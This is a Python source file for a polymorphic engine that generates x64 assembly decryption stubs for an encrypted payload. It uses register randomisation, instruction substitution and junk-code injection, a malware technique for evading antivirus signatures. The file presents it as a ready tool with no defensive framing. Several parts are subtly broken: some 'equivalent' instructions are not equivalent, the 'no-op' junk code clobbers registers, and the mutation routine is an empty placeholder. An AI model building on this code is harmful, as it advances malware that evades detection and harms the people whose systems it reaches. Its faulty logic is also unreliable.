"""
Polymorphic Engine - Code Mutation System
Based on 2026 research: Shredder-RS, Chameleon, Veil64

Features:
- Register randomization (210+ combinations)
- Instruction substitution (equivalent operations)
- Junk code injection (structured no-op sequences)
- Control flow permutation
"""

import random
import struct
from typing import List, Tuple, Dict

class PolymorphicEngine:
    """Generates polymorphic decryption stubs with unique instruction sequences"""
    
    # x64 general purpose registers (excluding RSP, RBP)
    REGISTERS = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
    
    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)
    
    def randomize_registers(self) -> Dict[str, str]:
        """Randomize register allocation for decryption routine"""
        available = self.REGISTERS.copy()
        random.shuffle(available)
        
        return {
            'data_ptr': available[0],    # Pointer to encrypted data
            'key_ptr': available[1],     # Pointer to key
            'counter': available[2],     # Loop counter
            'temp1': available[3],       # Temporary register 1
            'temp2': available[4],       # Temporary register 2
        }
    
    def generate_mov_equivalent(self, dest: str, src: str) -> List[str]:
        """Generate equivalent MOV instruction using different patterns"""
        variants = [
            # Direct MOV
            [f"mov {dest}, {src}"],
            
            # PUSH/POP
            [f"push {src}", f"pop {dest}"],
            
            # XOR + ADD
            [f"xor {dest}, {dest}", f"add {dest}, {src}"],
            
            # LEA (if source is register)
            [f"lea {dest}, [{src}]"],
        ]
        return random.choice(variants)
    
    def generate_xor_equivalent(self, dest: str, src: str) -> List[str]:
        """Generate equivalent XOR instruction"""
        variants = [
            # Direct XOR
            [f"xor {dest}, {src}"],
            
            # NOT + XOR + NOT (double negation)
            [f"not {dest}", f"xor {dest}, {src}", f"not {dest}"],
            
            # ADD + SUB (for specific patterns)
            [f"add {dest}, {src}", f"sub {dest}, {src}", f"sub {dest}, {src}"],
        ]
        return random.choice(variants)
    
    def generate_junk_code(self) -> List[str]:
        """Generate structured junk code (no net effect)"""
        junk_patterns = [
            # PUSH/POP pairs (register preservation)
            lambda: [f"push {random.choice(self.REGISTERS)}", 
                    f"pop {random.choice(self.REGISTERS)}"],
            
            # XOR reg, reg (zeroing)
            lambda: [f"xor {random.choice(self.REGISTERS)}, {random.choice(self.REGISTERS)}"],
            
            # MOV reg, reg (register shuffling)
            lambda: [f"mov {random.choice(self.REGISTERS)}, {random.choice(self.REGISTERS)}"],
            
            # NOP variants
            lambda: ["nop"],
            lambda: ["xchg rax, rax"],  # Multi-byte NOP
            
            # ADD/SUB cancellation
            lambda: [f"add {random.choice(self.REGISTERS)}, {random.randint(1, 255)}", 
                    f"sub {random.choice(self.REGISTERS)}, {random.randint(1, 255)}"],
        ]
        
        pattern = random.choice(junk_patterns)
        return pattern()
    
    def generate_decrypt_stub(self, key_size: int = 8) -> Tuple[bytes, Dict]:
        """
        Generate polymorphic decryption stub
        
        Returns:
            (stub_code, metadata) where metadata contains register mapping
        """
        regs = self.randomize_registers()
        instructions = []
        
        # Prologue
        instructions.append("push rbp")
        instructions.append("mov rbp, rsp")
        
        # Save callee-saved registers
        for reg in ['rbx', 'r12', 'r13', 'r14', 'r15']:
            if reg in regs.values():
                instructions.append(f"push {reg}")
        
        # Initialize counter (polymorphic)
        instructions.extend(self.generate_mov_equivalent(regs['counter'], '0'))
        
        # Inject junk before loop
        if random.random() < 0.3:
            instructions.extend(self.generate_junk_code())
        
        # Loop label
        instructions.append(".decrypt_loop:")
        
        # Load byte from data
        instructions.append(f"mov al, byte [{regs['data_ptr']} + {regs['counter']}]")
        
        # Load key byte (polymorphic)
        instructions.append(f"mov bl, byte [{regs['key_ptr']} + {regs['counter']}]")
        
        # XOR operation (polymorphic)
        instructions.extend(self.generate_xor_equivalent('al', 'bl'))
        
        # Store result
        instructions.append(f"mov byte [{regs['data_ptr']} + {regs['counter']}], al")
        
        # Inject junk in loop
        if random.random() < 0.2:
            instructions.extend(self.generate_junk_code())
        
        # Increment counter (polymorphic)
        inc_variants = [
            [f"inc {regs['counter']}"],
            [f"add {regs['counter']}, 1"],
            [f"lea {regs['counter']}, [{regs['counter']} + 1]"],
        ]
        instructions.extend(random.choice(inc_variants))
        
        # Loop condition
        instructions.append(f"cmp {regs['counter']}, {key_size}")
        instructions.append("jl .decrypt_loop")
        
        # Restore callee-saved registers
        for reg in reversed(['rbx', 'r12', 'r13', 'r14', 'r15']):
            if reg in regs.values():
                instructions.append(f"pop {reg}")
        
        # Epilogue
        instructions.append("pop rbp")
        instructions.append("ret")
        
        # Convert to assembly string
        asm_code = "\n".join(instructions)
        
        metadata = {
            'registers': regs,
            'instruction_count': len(instructions),
            'junk_injected': sum(1 for i in instructions if 'nop' in i or 'xchg' in i),
        }
        
        return asm_code.encode(), metadata
    
    def mutate_stub(self, stub_code: bytes, iterations: int = 3) -> bytes:
        """
        Apply multiple mutation passes to stub code
        
        Args:
            stub_code: Original stub assembly
            iterations: Number of mutation passes
        """
        code = stub_code.decode()
        
        for _ in range(iterations):
            # Re-randomize registers
            # Inject more junk
            # Reorder independent instructions
            pass
        
        return code.encode()

def generate_polymorphic_decryptor(payload_size: int, seed: int = None) -> bytes:
    """
    Generate a unique polymorphic decryption stub
    
    Args:
        payload_size: Size of encrypted payload
        seed: Random seed for reproducibility
    
    Returns:
        Assembly code for decryption stub
    """
    engine = PolymorphicEngine(seed)
    stub, metadata = engine.generate_decrypt_stub()
    
    print(f"[+] Polymorphic stub generated:")
    print(f"    Registers: {metadata['registers']}")
    print(f"    Instructions: {metadata['instruction_count']}")
    print(f"    Junk code: {metadata['junk_injected']} sequences")
    
    return stub

if __name__ == "__main__":
    # Test polymorphic engine
    print("=== Polymorphic Engine Test ===\n")
    
    # Generate 3 different stubs with same seed
    for i in range(3):
        print(f"\n--- Stub {i+1} ---")
        stub = generate_polymorphic_decryptor(1024, seed=i)
        print(f"Stub size: {len(stub)} bytes\n")
